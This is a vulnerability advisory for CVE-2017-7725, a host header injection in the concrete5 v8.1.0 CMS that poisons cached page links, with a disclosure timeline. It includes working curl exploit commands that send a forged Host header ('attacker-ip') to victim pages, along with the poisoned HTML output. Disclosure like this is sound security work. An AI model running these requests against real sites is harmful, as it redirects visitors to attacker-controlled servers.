@@ -1,0 +1,135 @@
+[+] Credits: John Page a.k.a hyp3rlinx	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/CONCRETE5-v8.1.0-HOST-HEADER-INJECTION.txt
+[+] ISR: ApparitionSec            
+ 
+
+
+Vendor:
+==================
+www.concrete5.org
+
+
+
+Product:
+================
+concrete5 v8.1.0
+
+concrete5 is an open-source content management system (CMS) for publishing content on the World Wide Web and intranets.
+
+
+Vulnerability Type:
+======================
+Host Header Injection
+
+
+
+CVE Reference:
+==============
+CVE-2017-7725
+
+
+
+Security Issue:
+================
+If a user does not specify a "canonical" URL on installation of concrete5, unauthenticated remote attackers can write to the
+"collectionversionblocksoutputcache" table of the MySQL Database, by making HTTP GET request with a poisoned HOST header.
+Some affected concrete5 webpages can then potentially render arbitrary links that can point to a malicious website.  
+
+Example MySQL data from "CollectionVersionBlocksOutputCache" table.
+
+(164, 1, 57, 'Header Site Title', '<a href="http://attacker-ip/concrete5-8.1.0/index.php" id="header-site-title">Elemental</a>', 1649861489
+
+
+e.g.
+
+c:\> curl -v http://VICTIM-IP/concrete5-8.1.0/index.php/services -H "Host: attacker-ip" | more
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="stylesheet" type="text/css" href="/concrete5-8.1.0/concrete/themes/elemental/css/bootstrap-modified.css">
+    <link href="/concrete5-8.1.0/application/files/cache/css/elemental/main.css?ts=1492101910" rel="stylesheet" type="text/css" media="all">
+<title>Services :: POC</title>
+
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"/>
+<meta name="generator" content="concrete5 - 8.1.0"/>
+<script type="text/javascript">
+    var CCM_DISPATCHER_FILENAME = "/concrete5-8.1.0/index.php";
+    var CCM_CID = 162;
+    var CCM_EDIT_MODE = false;
+    var CCM_ARRANGE_MODE = false;
+    var CCM_IMAGE_PATH = "/concrete5-8.1.0/concrete/images";
+    var CCM_TOOLS_PATH = "/concrete5-8.1.0/index.php/tools/required";
+    var CCM_APPLICATION_URL = "http://attacker-ip/concrete5-8.1.0";       <=================== HERE
+    var CCM_REL = "/concrete5-8.1.0";
+</script>
+
+
+
+Exploit:
+=========
+
+curl -v http://VICTIM-IP/concrete5-8.1.0/index.php/team/faq -H "Host: attacker-ip"
+curl -v http://VICTIM-IP/concrete5-8.1.0/index.php/services -H "Host: attacker-ip"
+curl -v http://VICTIM-IP/concrete5-8.1.0/index.php/portfolio -H "Host: attacker-ip"
+
+Navigate to one of these URLs:
+
+http://VICTIM-IP/concrete5-8.1.0/index.php/services
+http://VICTIM-IP/concrete5-8.1.0/index.php/portfolio
+
+Click on links in header portion of the webpage from one of the above URLs.
+
+Services
+Portfolio
+Team / Drop down Menu
+Blog
+Contact
+
+OR 
+
+click on the links on footer portion of the webpage.
+
+FAQ / Help 
+Case Studies
+Blog
+Another Link
+View on Google Maps
+
+
+Result: user gets redirected to attacker-ip.
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+Severity:
+=========
+High
+
+
+
+Disclosure Timeline:
+======================================================
+Vendor Notification :  April 11, 2017 
+Vendor reply: "this is a known issue" : April 12, 2017 
+Requested a CVE from mitre. 
+CVE assigned : April 12, 2017
+April 13, 2017  : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
